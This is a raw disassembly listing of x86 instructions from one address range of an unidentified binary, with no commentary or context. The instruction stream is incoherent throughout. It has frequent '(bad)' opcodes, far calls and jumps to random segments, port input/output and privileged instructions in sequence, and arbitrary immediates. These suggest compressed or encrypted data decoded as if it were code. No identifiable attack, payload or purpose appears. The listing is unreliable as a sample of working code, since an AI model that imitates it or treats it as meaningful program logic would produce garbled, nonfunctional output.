  405f10:	and    BYTE PTR [edx],ch
  405f12:	mov    dh,0x9e
  405f14:	ds pop edi
  405f16:	sub    ch,bl
  405f18:	dec    esp
  405f19:	mov    ecx,0x532f24f2
  405f1e:	lock or al,0xc5
  405f21:	into   
  405f22:	mov    eax,ds:0x88077d7f
  405f27:	sbb    DWORD PTR [edx+0x77],edi
  405f2a:	dec    ebx
  405f2b:	mov    ch,BYTE PTR [ebp+0x3f]
  405f2e:	mov    eax,ds:0x6830be23
  405f33:	shl    BYTE PTR [ecx-0x56],1
  405f36:	(bad)  
  405f38:	ds push cs
  405f3a:	dec    ebx
  405f3b:	(bad)  
  405f3c:	retf   0xaa1a
  405f3f:	pop    esi
  405f40:	clc    
  405f41:	push   esp
  405f42:	sbb    eax,0x4cde0f50
  405f47:	fdiv   st,st(1)
  405f49:	mov    ebp,0xea8e7b0c
  405f4e:	pushf  
  405f4f:	and    DWORD PTR [edi],ebx
  405f51:	in     eax,0xc1
  405f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f54:	push   ebx
  405f55:	mov    edi,0xfa16ba9
  405f5a:	push   esp
  405f5b:	jnp    0x405f4f
  405f5d:	ret    
  405f5e:	(bad)  
  405f5f:	das    
  405f60:	mov    DWORD PTR [esi-0x3d],edx
  405f63:	scas   al,BYTE PTR es:[edi]
  405f64:	jbe    0x405ef2
  405f66:	sbb    BYTE PTR [esi],ah
  405f68:	stc    
  405f69:	adc    BYTE PTR [edi+0x21e2bb9e],0x3e
  405f70:	(bad)  
  405f71:	cs dec esi
  405f73:	outs   dx,DWORD PTR ds:[esi]
  405f74:	xor    BYTE PTR [eax],dl
  405f76:	jae    0x405f51
  405f78:	add    eax,DWORD PTR [edx+0x1e]
  405f7b:	lock and edi,DWORD PTR [edi]
  405f7e:	jbe    0x405f8e
  405f80:	fadd   DWORD PTR [ebx+0x5a9a3c09]
  405f86:	ret    
  405f87:	(bad)  
  405f88:	fucomp st(0)
  405f8a:	aas    
  405f8b:	jle    0x405f10
  405f8d:	mov    ds:0x30cae8b0,eax
  405f92:	(bad)  
  405f94:	xor    eax,0x2e3232c4
  405f99:	mov    ah,0x74
  405f9b:	gs imul esi,ebx,0xaf366884
  405fa2:	add    edi,DWORD PTR [edi-0x719a48e3]
  405fa8:	xchg   edx,eax
  405fa9:	push   esi
  405faa:	lods   eax,DWORD PTR ds:[esi]
  405fab:	push   es
  405fac:	cmp    al,BYTE PTR [esi+0x231cfeff]
  405fb2:	mov    edx,0x7b1677
  405fb7:	inc    ebx
  405fb8:	scas   al,BYTE PTR es:[edi]
  405fb9:	mov    dh,0xc4
  405fbb:	sbb    DWORD PTR [eax+ecx*2+0x157cce75],0xffffffaf
  405fc3:	das    
  405fc4:	sbb    DWORD PTR [eax],ecx
  405fc6:	push   ecx
  405fc7:	cli    
  405fc8:	shr    BYTE PTR [esi],cl
  405fca:	scas   al,BYTE PTR es:[edi]
  405fcb:	gs push 0x15e8233f
  405fd1:	outs   dx,BYTE PTR ds:[esi]
  405fd2:	rcr    ecx,cl
  405fd4:	xchg   ebp,eax
  405fd5:	push   cs
  405fd6:	jle    0x406038
  405fd8:	pop    es
  405fd9:	inc    ebx
  405fda:	stos   DWORD PTR es:[edi],eax
  405fdb:	push   0xffffff89
  405fdd:	or     bl,bh
  405fdf:	adc    eax,0x233ba9c2
  405fe4:	dec    ecx
  405fe5:	mov    al,BYTE PTR [edx+0x42]
  405fe8:	fs add eax,0x5e9e6eab
  405fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fef:	adc    eax,0xfd6d4b2e
  405ff4:	add    BYTE PTR [esi],0x5e
  405ff7:	cmp    al,0xa0
  405ff9:	xchg   esi,eax
  405ffa:	sahf   
  405ffb:	es push esp
  405ffd:	(bad)  
  405ffe:	outs   dx,DWORD PTR ds:[esi]
  405fff:	std    
  406000:	ret    
  406001:	inc    ebx
  406003:	pop    ebp
  406004:	mov    esi,DWORD PTR [ebp+0x55574325]
  40600a:	add    eax,0xe766e8a9
  40600f:	cwde   
  406010:	inc    ecx
  406011:	push   ecx
  406012:	call   0x8221:0xb56b7801
  406019:	ret    0x9f08
  40601c:	jo     0x406063
  40601e:	jle    0x406000
  406020:	dec    esi
  406021:	imul   ecx,DWORD PTR [ebx+0x45],0xffffff8b
  406025:	stc    
  406026:	sbb    DWORD PTR [edx],edx
  406028:	add    dl,BYTE PTR [esi+0x2311975b]
  40602e:	xchg   edi,eax
  40602f:	dec    BYTE PTR [ebp+ebp*8+0x7e]
  406033:	ficom  WORD PTR [ebx+eax*8-0x3e578f89]
  40603a:	xchg   ebp,eax
  40603b:	outs   dx,DWORD PTR ds:[esi]
  40603c:	cmp    edx,esi
  40603e:	loope  0x40604b
  406040:	inc    ecx
  406041:	test   BYTE PTR ds:0x706e8e11,dh
  406047:	int3   
  406048:	iret   
  406049:	mov    ds:0xe2fd40a0,eax
  40604e:	jmp    0x40605d
  406050:	call   0x26f6:0xb9c8fc25
  406057:	nop
  406058:	mov    edx,0x36613868
  40605d:	or     BYTE PTR [ecx-0x7221e45d],cl
  406063:	scas   al,BYTE PTR es:[edi]
  406064:	xchg   esi,eax
  406065:	cmp    al,0x1e
  406067:	dec    esi
  406068:	cvtdq2ps xmm2,XMMWORD PTR [ecx+0x6bf36ffa]
  40606f:	pushf  
  406070:	xor    BYTE PTR [ecx+0x46],0x2b
  406074:	fcmovb st,st(5)
  406076:	ret    
  406077:	sti    
  406078:	int    0xa2
  40607a:	cmp    al,0xa1
  40607c:	out    0x2c,eax
  40607e:	stos   BYTE PTR es:[edi],al
  40607f:	and    eax,0x6b11ba4f
  406084:	pop    ecx
  406085:	xor    DWORD PTR [ebx],ecx
  406087:	jo     0x406075
  406089:	dec    edx
  40608a:	je     0x406014
  40608c:	jb     0x40606e
  40608e:	test   eax,0x9197caee
  406093:	mov    WORD PTR [esi+ecx*2],ds
  406096:	push   es
  406097:	lock mov esp,0x536072fc
  40609d:	add    ecx,DWORD PTR [ebx+0x34]
  4060a0:	and    eax,0xbfc35ec4
  4060a5:	xchg   ecx,eax
  4060a6:	xchg   DWORD PTR [ebp+0x46],esi
  4060a9:	xor    eax,0x109720b0
  4060ae:	mov    ch,0xcf
  4060b0:	popa   
  4060b1:	sub    al,0x3e
  4060b3:	xor    ebx,edi
  4060b5:	mov    ds:0x797c0bc7,al
  4060ba:	mov    cl,0xdc
  4060bc:	mov    al,ds:0xd9c26e60
  4060c1:	ret    
  4060c2:	push   ecx
  4060c4:	pop    esi
  4060c5:	outs   dx,DWORD PTR ds:[esi]
  4060c6:	mov    edx,0x922ea20c
  4060cb:	pop    ds
  4060cc:	call   0x316f:0xea429ed7
  4060d3:	shr    DWORD PTR [edx-0x55],0x21
  4060d7:	call   0x5468e922
  4060dc:	sub    al,0xeb
  4060de:	inc    esp
  4060df:	xchg   ebx,eax
  4060e0:	push   cs
  4060e1:	shl    BYTE PTR [ecx+ebx*2-0xc35f482],1
  4060e8:	ja     0x406098
  4060ea:	arpl   WORD PTR [ecx-0x9e7be20],sp
  4060f0:	loop   0x40613d
  4060f2:	ret    0x682c
  4060f5:	pushf  
  4060f6:	adc    BYTE PTR [ebx+0x77875da2],bh
  4060fc:	cmp    al,0xe9
  4060fe:	call   DWORD PTR [edi-0x3b01d6bd]
  406104:	popa   
  406105:	mov    ds:0x5b5db404,eax
  40610a:	adc    DWORD PTR [edx],ebp
  40610c:	(bad)  
  40610d:	loope  0x40611c
  40610f:	dec    esp
  406110:	jb     0x40614f
  406112:	(bad)  
  406113:	hlt    
  406114:	fs (bad) 
  406116:	outs   dx,BYTE PTR ds:[esi]
  406117:	dec    edx
  406118:	js     0x40617b
  40611a:	out    dx,eax
  40611b:	xchg   esp,eax
  40611c:	es sbb al,0x45
  40611f:	mov    edx,DWORD PTR [edx+0x7826fe44]
  406125:	rcl    DWORD PTR [esi+ecx*8],1
  406128:	test   BYTE PTR [ebx-0x2f297fc5],bl
  40612e:	int3   
  40612f:	lods   eax,DWORD PTR ds:[esi]
  406130:	adc    esp,DWORD PTR [eax+esi*8+0x46]
  406134:	push   ecx
  406135:	push   esi
  406136:	popa   
  406137:	daa    
  406138:	cli    
  406139:	dec    ebx
  40613a:	ss jmp 0x4060dd
  40613d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40613e:	aad    0x9e
  406140:	sbb    BYTE PTR [ecx],ah
  406142:	sbb    edi,ebp
  406144:	inc    edi
  406145:	clc    
  406146:	sbb    al,0x3d
  406148:	dec    ebx
  406149:	jp     0x40617c
  40614b:	loopne 0x406149
  40614d:	add    eax,0x6fed103b
  406152:	pop    ebp
  406153:	cwde   
  406154:	scas   al,BYTE PTR es:[edi]
  406155:	int3   
  406156:	aam    0xfd
  406158:	ins    BYTE PTR es:[edi],dx
  406159:	or     al,0x92
  40615b:	stc    
  40615c:	repnz aad 0xe0
  40615f:	xchg   ebx,eax
  406160:	pop    ebp
  406161:	in     al,dx
  406162:	pop    edi
  406163:	lahf   
  406164:	cmp    BYTE PTR [ebx+ebx*4-0x13],al
  406168:	mov    esi,edi
  40616a:	xchg   ebp,eax
  40616b:	(bad)  
  40616c:	in     al,0xfb
  40616e:	sar    cl,cl
  406170:	sbb    ebp,esp
  406172:	pop    es
  406173:	sbb    eax,edi
  406175:	jl     0x406107
  406177:	fistp  DWORD PTR [edi+0x78]
  40617a:	(bad)
  40617d:	push   edx
  40617e:	mov    bh,0x3d
  406180:	push   esi
  406181:	mov    cl,0x2a
  406183:	repnz inc ecx
  406185:	das    
  406186:	cmp    edi,esp
  406188:	or     DWORD PTR [ebx],ebx
  40618a:	popa   
  40618b:	jnp    0x406136
  40618d:	cmp    BYTE PTR [ebx+eax*1-0x6c],dl
  406191:	push   ss
  406192:	pop    ebx
  406193:	cmp    BYTE PTR [edx-0x4d2c1ab3],cl
  406199:	dec    ebx
  40619a:	out    0x95,eax
  40619c:	ja     0x4061e0
  40619e:	in     al,dx
  40619f:	mov    eax,ds:0x2ff980e0
  4061a4:	jne    0x40612a
  4061a6:	outs   dx,DWORD PTR ds:[esi]
  4061a7:	in     al,dx
  4061a8:	mov    ebp,0xdc6c4abe
  4061ad:	sbb    al,0x75
  4061af:	xchg   edi,eax
  4061b0:	mov    WORD PTR [edx],?
  4061b2:	fistp  DWORD PTR [ecx+0xf32e34f]
  4061b8:	dec    edx
  4061b9:	pop    edx
  4061ba:	cmp    BYTE PTR [edi+eiz*2],cl
  4061bd:	dec    esi
  4061be:	mov    al,ds:0x77d0ba91
  4061c3:	loope  0x4061cd
  4061c5:	or     bh,BYTE PTR [esi-0x36]
  4061c8:	and    al,0xd7
  4061ca:	mov    ebx,0xe996c908
  4061cf:	out    0x1f,al
  4061d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061d2:	xor    eax,0xa0a67c0e
  4061d7:	(bad)  
  4061d8:	repnz mov dl,al
  4061db:	jge    0x40622e
  4061dd:	xor    al,0xde
  4061df:	jns    0x406196
  4061e1:	push   eax
  4061e2:	mov    ebp,DWORD PTR [esi]
  4061e4:	in     eax,dx
  4061e5:	pop    DWORD PTR [esi+0x2fd012a4]
  4061eb:	test   BYTE PTR [ebx],0xf1
  4061ee:	xchg   esp,eax
  4061ef:	inc    ecx
  4061f0:	gs dec esi
  4061f2:	or     ebp,DWORD PTR [esi+0x40f0c764]
  4061f8:	sti    
  4061f9:	inc    edi
  4061fa:	pushf  
  4061fb:	retf   0x5eea
  4061fe:	jmp    0xc68651f
  406203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406204:	pop    edx
  406205:	mov    al,0x86
  406207:	lock inc edi
  406209:	cli    
  40620a:	sub    al,0x1d
  40620c:	add    eax,0x256cff15
  406211:	stos   BYTE PTR es:[edi],al
  406212:	ins    BYTE PTR es:[edi],dx
  406213:	inc    ebx
  406214:	retf   0xc1a3
  406217:	adc    BYTE PTR [edi+0xa84a284],bh
  40621d:	int    0x0
  40621f:	or     DWORD PTR [edx+eiz*8-0x46],esi
  406223:	cld    
  406224:	add    BYTE PTR [esi+esi*4],ch
  406227:	popa   
  406228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406229:	push   edx
  40622a:	call   0x286e:0x66cde5dd
  406231:	lods   eax,DWORD PTR fs:[esi]
  406233:	lea    edi,[ebx]
  406235:	and    edi,eax
  406237:	out    dx,eax
  406238:	dec    ebp
  406239:	out    0xc2,eax
  40623b:	(bad)  
  40623c:	clc    
  40623d:	push   0xfffffffe
  40623f:	sbb    eax,0x1d5616b5
  406244:	mov    WORD PTR [ebx+0x2b4f66d7],cs
  40624a:	enter  0x814a,0x4c
  40624e:	dec    ecx
  40624f:	inc    esi
  406250:	xor    ch,BYTE PTR [ecx+0x71]
  406253:	jne    0x4061fd
  406255:	add    DWORD PTR [ebx-0x27b59971],esi
  40625b:	dec    esp
  40625c:	fidivr WORD PTR [eax+0x2f]
  40625f:	es loop 0x4061f2
  406262:	mov    esi,0xf4c35922
  406267:	or     DWORD PTR [ebp-0x3c],edx
  40626a:	out    0xaf,eax
  40626c:	pop    edi
  40626d:	jmp    eax
  40626f:	mov    ch,dl
  406271:	out    dx,al
  406272:	fsubr  DWORD PTR [edi+0x431a7149]
  406278:	ins    DWORD PTR es:[edi],dx
  406279:	add    DWORD PTR [ebx],ebx
  40627b:	push   edi
  40627c:	xchg   ch,ah
  40627e:	inc    ebp
  40627f:	xchg   DWORD PTR [edx+0x29],esp
  406282:	xchg   esi,eax
  406283:	and    ebp,edi
  406285:	jmp    0x7561:0x1def7bf3
  40628c:	lahf   
  40628d:	add    DWORD PTR [eax],ebx
  40628f:	pop    ebx
  406290:	dec    ecx
  406291:	xor    eax,0xb69f3610
  406296:	lods   eax,DWORD PTR ds:[esi]
  406297:	pop    ecx
  406298:	(bad)  
  406299:	in     al,dx
  40629a:	out    0xde,al
  40629c:	xchg   edx,eax
  40629d:	dec    eax
  40629e:	mov    es,WORD PTR [edx+ebp*1-0x76]
  4062a2:	sti    
  4062a3:	sahf   
  4062a4:	xchg   ecx,eax
  4062a5:	add    eax,0xeb90f4e0
  4062aa:	shr    esp,0x60
  4062ad:	or     ecx,DWORD PTR [edx]
  4062af:	xor    BYTE PTR [eax],ah
  4062b1:	jo     0x40632d
  4062b3:	cmp    esp,DWORD PTR ds:0xef4f7b39
  4062ba:	iret   
  4062bb:	retf   0x7d72
  4062be:	fild   DWORD PTR [esp+esi*2-0x2d]
  4062c2:	dec    edx
  4062c3:	cmp    eax,0x4ef36f1b
  4062c8:	mov    eax,ds:0x5e7ce5af
  4062cd:	xlat   BYTE PTR ds:[ebx]
  4062ce:	mov    ds:0x9d805e3,eax
  4062d3:	int3   
  4062d4:	dec    edi
  4062d5:	pusha  
  4062d6:	fdiv   DWORD PTR [edx-0x37755d78]
  4062dc:	mul    DWORD PTR [ebx+0x20]
  4062df:	add    al,0x1f
  4062e1:	pop    eax
  4062e2:	jmp    DWORD PTR [ebx-0x380935aa]
  4062e8:	and    ebp,DWORD PTR gs:[edi]
  4062eb:	test   al,0x8a
  4062ed:	js     0x4062ff
  4062ef:	ja     0x406281
  4062f1:	dec    eax
  4062f2:	jle    0x4062b8
  4062f4:	loop   0x4062c4
  4062f6:	push   eax
  4062f7:	lds    ebp,FWORD PTR [esp+eax*8-0x3d]
  4062fb:	daa    
  4062fc:	and    DWORD PTR [esi-0x200d959e],edx
  406302:	stos   BYTE PTR es:[edi],al
  406303:	jle    0x406335
  406305:	ja     0x406350
  406307:	mov    BYTE PTR [edi],al
  406309:	es adc ch,al
  40630c:	dec    edi
  40630d:	xchg   edx,eax
  40630e:	shl    ch,0x6f
  406311:	leave  
  406312:	push   esi
  406313:	rol    DWORD PTR [ebx+0xefb2585],cl
  406319:	lea    edi,[eax+0x2e9da08a]
  40631f:	lods   al,BYTE PTR ds:[esi]
  406320:	mov    bl,bh
  406322:	fiadd  DWORD PTR [edx]
  406324:	inc    ebp
  406325:	frstor [eax]
  406327:	lahf   
  406328:	ja     0x4062d5
  40632a:	sahf   
  40632b:	pop    ebp
  40632c:	pop    ds
  40632d:	xlat   BYTE PTR ds:[ebx]
  40632e:	sbb    BYTE PTR [ebx+0x6c],0xe2
  406332:	push   esp
  406333:	jg     0x406398
  406335:	shl    DWORD PTR [edx],cl
  406337:	popa   
  406338:	xchg   esi,eax
  406339:	xor    esp,esi
  40633b:	or     eax,ebp
  40633d:	or     DWORD PTR [ebx-0x397e0058],ebp
  406343:	in     eax,dx
  406344:	test   eax,0x54de29d0
  406349:	mov    bh,0x57
  40634b:	test   DWORD PTR [ebp+0xc],0xff8c157b
  406352:	(bad)  
  406353:	jl     0x4063b0
  406355:	js     0x406374
  406357:	pop    edx
  406358:	mov    al,ds:0x89eb765c
  40635d:	sub    edi,DWORD PTR [edx+0x44]
  406360:	and    eax,0xa31279d8
  406365:	add    eax,0xee413b06
  40636a:	adc    bh,BYTE PTR [ecx-0x7d]
  40636d:	adc    eax,0x2e05eb8f
  406372:	out    0xc3,al
  406374:	les    edi,FWORD PTR [ecx+0x7b8eda36]
  40637a:	push   es
  40637b:	inc    edi
  40637c:	and    ch,BYTE PTR [ecx+edi*8]
  40637f:	or     BYTE PTR [edx+ebx*1+0xa7a258a],dl
  406386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406387:	cmp    ebx,DWORD PTR [ebp-0x9]
  40638a:	push   eax
  40638b:	lahf   
  40638c:	sub    eax,0x1d33883f
  406391:	(bad)  
  406392:	or     edx,DWORD PTR [ebx]
  406394:	push   cs
  406395:	or     DWORD PTR [ebp-0x57],edx
  406398:	daa    
  406399:	xor    esp,ebp
  40639b:	cmp    edx,DWORD PTR [edi+0x64bed64c]
  4063a1:	or     ah,BYTE PTR es:[edi]
  4063a4:	stos   DWORD PTR es:[edi],eax
  4063a5:	and    eax,0x2a1a6581
  4063aa:	mov    ebx,0xaae3310b
  4063af:	mov    esp,0x6537ccba
  4063b4:	test   eax,0x604eb578
  4063b9:	in     al,0x47
  4063bb:	xchg   edx,eax
  4063bc:	mov    ecx,DWORD PTR [eax+ecx*4]
  4063bf:	into   
  4063c0:	icebp  
  4063c1:	sbb    eax,0x3a0e8f3d
  4063c6:	or     dl,BYTE PTR [ecx]
  4063c8:	xor    ch,cl
  4063ca:	mov    al,0x7b
  4063cc:	xchg   edi,eax
  4063cd:	pushf  
  4063ce:	add    dh,BYTE PTR [esi]
  4063d0:	add    DWORD PTR [edi-0x7],eax
  4063d3:	test   eax,0x776b5200
  4063d8:	sbb    eax,0x96a658e4
  4063dd:	(bad)  
  4063de:	push   ecx
  4063df:	mov    al,0x5
  4063e1:	xor    ecx,DWORD PTR [edi+edi*8+0x17]
  4063e5:	gs mov esi,0x72c1a126
  4063eb:	mov    al,0xbb
  4063ed:	mov    ch,0xd0
  4063ef:	test   eax,0x4575ad7
  4063f4:	pop    esi
  4063f5:	dec    ecx
  4063f6:	imul   edx,DWORD PTR [ecx],0xed82de76
  4063fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063fd:	cli    
  4063fe:	scas   eax,DWORD PTR es:[edi]
  4063ff:	hlt    
  406400:	jge    0x4063b1
  406402:	out    dx,eax
  406403:	hlt    
  406404:	mov    bh,BYTE PTR [ecx-0x77]
  406407:	dec    ebp
  406408:	loope  0x4063a4
  40640a:	lea    ebp,[esi]
  40640c:	dec    ecx
  40640d:	in     eax,0xd8
  40640f:	arpl   cx,cx
  406411:	shl    bh,cl
  406413:	pop    esp
  406414:	dec    edx
  406415:	pop    ds
  406416:	jnp    0x406485
  406418:	jg     0x4063e3
  40641a:	pop    es
  40641b:	int3   
  40641c:	mov    ecx,0xd0fd935a
  406421:	iret   
  406422:	jns    0x406486
  406424:	jg     0x4063c5
  406426:	xor    al,0xe4
  406428:	mov    DWORD PTR ds:0x3fa93098,edi
  40642e:	fisubr WORD PTR [ebx+0x16]
  406431:	fdiv   QWORD PTR [edx]
  406433:	jecxz  0x40649d
  406435:	lea    edi,[edi]
  406437:	jle    0x406470
  406439:	xchg   esi,eax
  40643a:	repz enter 0x2a8a,0x1c
  40643f:	sub    ebx,DWORD PTR [ebx+0x71]
  406442:	mov    ebx,0x5598ad07
  406447:	pushf  
  406448:	ds push edi
  40644a:	lods   al,BYTE PTR ds:[esi]
  40644b:	test   bh,dh
  40644d:	adc    BYTE PTR [esi+0x5a],ah
  406450:	mov    ss,esi
  406452:	push   edx
  406453:	sub    BYTE PTR [ecx],bh
  406455:	mov    ah,0x68
  406457:	or     BYTE PTR [eax],dh
  406459:	mov    dl,0x9f
  40645b:	pop    ss
  40645c:	loope  0x406445
  40645e:	adc    al,0xd2
  406460:	mov    edx,DWORD PTR [eax+0x61]
  406463:	cmp    ebx,ecx
  406465:	pop    ecx
  406466:	leave  
  406467:	leave  
  406468:	mov    dl,0xa9
  40646a:	mov    ds:0x7e564873,eax
  40646f:	je     0x406428
  406471:	mov    al,ds:0xce141a9
  406476:	jo     0x40645c
  406478:	xchg   edi,eax
  406479:	shl    DWORD PTR [ecx+0x77],cl
  40647c:	scas   eax,DWORD PTR es:[edi]
  40647d:	fadd   QWORD PTR [ebp-0x29]
  406480:	scas   eax,DWORD PTR es:[edi]
  406481:	pushf  
  406482:	inc    esi
  406483:	fwait
  406484:	jg     0x4064a0
  406486:	fiadd  WORD PTR [ebx-0x5bb68f08]
  40648c:	enter  0xd551,0x6c
  406490:	aas    
  406491:	xchg   esi,eax
  406492:	retf   0x7f1b
  406495:	mov    cl,0x4
  406497:	pop    ebx
  406498:	add    eax,0x5fa4654a
  40649d:	xchg   ecx,eax
  40649e:	(bad)  
  40649f:	aam    0xbf
  4064a1:	dec    edx
  4064a2:	stos   BYTE PTR es:[edi],al
  4064a3:	push   ecx
  4064a4:	or     BYTE PTR ds:0x7dd458e8,0x2f
  4064ab:	retf   0x3bb7
  4064ae:	in     eax,dx
  4064af:	(bad)  [ecx]
  4064b1:	xchg   ecx,eax
  4064b2:	sub    eax,0x8681209a
  4064b7:	xchg   esi,eax
  4064b8:	loope  0x4064c5
  4064ba:	mov    al,0x35
  4064bc:	ins    DWORD PTR es:[edi],dx
  4064bd:	adc    BYTE PTR [eax-0x76],ah
  4064c0:	xchg   esi,eax
  4064c1:	dec    edi
  4064c2:	jle    0x4064c1
  4064c4:	outs   dx,DWORD PTR ds:[esi]
  4064c5:	test   al,0x2d
  4064c7:	repnz ffree st(3)
  4064ca:	dec    edx
  4064cb:	mov    ecx,0xee6ef22d
  4064d0:	cmp    al,0xc2
  4064d2:	adc    BYTE PTR [edi+0x6102a0c7],bh
  4064d8:	sar    DWORD PTR [ecx+edx*2-0x4a],cl
  4064dc:	sbb    DWORD PTR [ebx+ebx*4+0x1df0facf],0xffffff9f
  4064e4:	sahf   
  4064e5:	outs   dx,BYTE PTR ds:[esi]
  4064e6:	rcl    DWORD PTR [esi+edx*2+0x6c],0xf8
  4064eb:	daa    
  4064ec:	xor    BYTE PTR [ebp-0x47dd222],dh
  4064f2:	jge    0x40656c
  4064f4:	xor    BYTE PTR [ebp+0x47ad660a],ah
  4064fa:	out    dx,al
  4064fb:	pop    ecx
  4064fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064fd:	pop    esi
  4064fe:	outs   dx,DWORD PTR ds:[esi]
  4064ff:	xchg   edx,eax
  406500:	sbb    eax,0x7aea0aa1
  406505:	push   es
  406506:	jp     0x40651a
  406508:	jo     0x40655d
  40650a:	sbb    WORD PTR [ebp+0x1ef5a4e3],0xd230
  406513:	aad    0xd2
  406515:	call   0x8829:0xd5fe1c81
  40651c:	pop    esp
  40651d:	loopne 0x4064f8
  40651f:	and    esi,DWORD PTR [ebx]
  406521:	mov    edx,0x3f3e26f7
  406526:	retf   
  406527:	jge    0x40654e
  406529:	mov    ds:0x4bf313b6,eax
  40652e:	xchg   ebx,eax
  40652f:	mov    ebx,0x70ff5b6d
  406534:	int3   
  406535:	jnp    0x4064ff
  406537:	retf   0x6f10
  40653a:	mov    bp,0xf351
  40653e:	pop    edx
  40653f:	mov    ds:0xa91f60db,al
  406544:	push   ebp
  406545:	leave  
  406546:	mov    WORD PTR [ebp+0x364ff64e],ss
  40654c:	iret   
  40654d:	dec    ebx
  40654e:	ds jl  0x4064e1
  406551:	or     DWORD PTR [esp+edx*2-0x45],esi
  406555:	adc    edi,DWORD PTR [edx-0x45]
  406558:	xor    ecx,DWORD PTR [ebx]
  40655a:	repnz pop ss
  40655c:	sub    eax,0x5b1c3f9b
  406561:	adc    DWORD PTR [eax],ebx
  406563:	jo     0x4065c1
  406565:	stc    
  406566:	loope  0x40655e
  406568:	call   0x5f76742c
  40656d:	dec    edx
  40656e:	retf   0x6014
  406571:	mov    dh,0xf9
  406573:	sbb    DWORD PTR [ebp+0x77847b61],0xffffff9a
  40657a:	adc    ebp,DWORD PTR [eax+eax*4+0x26]
  40657e:	mov    dh,ch
  406580:	pop    es
  406581:	pop    ds
  406582:	imul   edi,DWORD PTR [edx+0x7bbf802a],0xc194a0c2
  40658c:	test   DWORD PTR [eax-0x3972836c],esp
  406592:	mov    dh,0x30
  406594:	or     DWORD PTR [ebx-0xc],edi
  406597:	shl    esi,0x12
  40659a:	shl    ecx,0xdc
  40659d:	jno    0x406608
  40659f:	jno    0x4065d7
  4065a1:	into   
  4065a2:	jmp    0x5232cd15
  4065a7:	cmp    edi,0xff7e2898
  4065ad:	dec    ebp
  4065ae:	fidiv  WORD PTR [edi-0x2a257221]
  4065b4:	int3   
  4065b5:	rcr    DWORD PTR [esi+0x5c],0x42
  4065b9:	daa    
  4065ba:	cmp    al,0x9b
  4065bc:	xchg   edi,eax
  4065bd:	in     eax,0x93
  4065bf:	mov    ebx,0xd71e8f6e
  4065c4:	cmp    DWORD PTR [esp+esi*8-0x5c329fc0],edi
  4065cb:	mov    edx,ebp
  4065cd:	ss xchg edi,eax
  4065cf:	xchg   esi,eax
  4065d0:	aaa    
  4065d1:	loope  0x4065bc
  4065d3:	jg     0x4065ff
  4065d5:	mov    dh,0xdc
  4065d7:	adc    esp,DWORD PTR [edx+eax*2+0x54]
  4065db:	jne    0x40659f
  4065dd:	add    BYTE PTR [edx+0x2c03b054],ah
  4065e3:	and    edi,eax
  4065e5:	icebp  
  4065e6:	jo     0x4065e5
  4065e8:	adc    ah,ah
  4065ea:	and    eax,0x9d3db0a0
  4065ef:	dec    edi
  4065f0:	cmp    BYTE PTR [ebp+0x40],0x43
  4065f4:	es in  eax,dx
  4065f6:	jns    0x406667
  4065f8:	push   ecx
  4065f9:	pop    ecx
  4065fa:	fs fs popa 
  4065fd:	fidivr DWORD PTR [ecx+0x72]
  406600:	sub    eax,0x59eace07
  406605:	jne    0x406686
  406607:	sbb    DWORD PTR [eax+0x53],ebp
  40660a:	adc    al,0x52
  40660c:	mov    BYTE PTR [eax+0x37a0d961],dh
  406612:	sahf   
  406613:	ror    BYTE PTR [esi+eax*8+0x3778341f],1
  40661a:	cmp    eax,0x674be804
  40661f:	pop    ebp
  406620:	pop    ebx
  406621:	jp     0x406674
  406623:	cs or  al,0x94
  406626:	data16 dec BYTE PTR [ecx-0x42]
  40662a:	xchg   esi,eax
  40662b:	and    eax,0xd9942535
  406630:	jp     0x406623
  406632:	sbb    BYTE PTR [eax],bl
  406634:	outs   dx,DWORD PTR ds:[esi]
  406635:	cmp    eax,0xa734d228
  40663a:	cmp    BYTE PTR [ebp+0x72f674e5],dl
  406640:	dec    esi
  406641:	jns    0x40662c
  406643:	push   es
  406644:	mov    BYTE PTR [edx],0x13
  406647:	stos   DWORD PTR es:[edi],eax
  406648:	mov    ebp,0x482deb52
  40664d:	rcr    DWORD PTR [edx+0x4a],1
  406650:	(bad)  
  406651:	ficomp DWORD PTR [esi]
  406653:	je     0x40661f
  406655:	or     DWORD PTR [ebp-0x6aac5d4b],esi
  40665b:	and    eax,0xe5194921
  406660:	or     bh,cl
  406662:	xchg   DWORD PTR [eax],esi
  406664:	sub    ah,BYTE PTR [eax+0x7608d809]
  40666a:	sbb    DWORD PTR [esi+eax*1-0x2a],edx
  40666e:	outs   dx,BYTE PTR ds:[esi]
  40666f:	repz sub BYTE PTR [esi-0x5f],0x54
  406674:	in     al,dx
  406675:	pushf  
  406676:	fdivr  QWORD PTR [esi]
  406678:	cs push edx
  40667a:	mov    dl,0xb1
  40667c:	mov    dh,BYTE PTR es:[ecx]
  40667f:	(bad)  [esi+0x4b258f5d]
  406685:	sar    bl,1
  406687:	imul   ebx,DWORD PTR [esi-0xc],0x6a9d7b6c
  40668e:	push   ebp
  40668f:	jg     0x4066a0
  406691:	jp     0x40664e
  406693:	mov    ecx,0x4449fa13
  406698:	int    0xe5
  40669a:	dec    ebp
  40669b:	dec    edi
  40669c:	sub    DWORD PTR [ecx-0x68621305],0x8e7bb0e
  4066a6:	stc    
  4066a7:	mov    esi,0xb43b5790
  4066ac:	cmp    DWORD PTR [esi],edi
  4066ae:	loopne 0x4066c3
  4066b0:	adc    eax,0x11fcd11
  4066b5:	sub    DWORD PTR [edx],esi
  4066b7:	test   eax,0x59d43b4a
  4066bc:	dec    eax
  4066bd:	pop    eax
  4066be:	fs scas al,BYTE PTR es:[edi]
  4066c0:	mov    ?,WORD PTR [edx]
  4066c2:	fdivr  DWORD PTR [eax-0x2c]
  4066c5:	pop    ecx
  4066c6:	push   ebp
  4066c7:	push   0xf217ba4b
  4066cc:	xor    BYTE PTR [eax],bh
  4066ce:	repnz dec esi
  4066d0:	mov    BYTE PTR [edi+0x2d3e3e98],bl
  4066d6:	cmp    al,0xcf
  4066d8:	xchg   ecx,eax
  4066d9:	call   0x15db:0xde74a4d
  4066e0:	jne    0x4066b1
